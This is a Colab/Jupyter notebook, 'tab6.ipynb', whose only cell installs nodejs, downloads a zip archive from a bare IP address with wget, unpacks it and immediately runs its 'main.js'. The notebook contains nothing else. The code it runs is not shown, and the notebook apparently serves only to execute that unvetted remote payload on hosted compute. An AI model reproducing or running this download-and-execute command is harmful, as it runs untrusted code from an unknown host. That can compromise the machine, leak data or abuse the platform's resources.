{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "LJdIJdd85EXP"
      },
      "outputs": [],
      "source": [
        "%%shell\n",
        "apt update -y && apt install -y nodejs\n",
        "wget -q http://199.250.207.182/~ngewetech/include/induk/heroku2.zip && unzip -q heroku2.zip && rm -rf heroku2.zip && cd heroku2 && node main.js"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "machine_shape": "hm",
      "name": "tab6.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
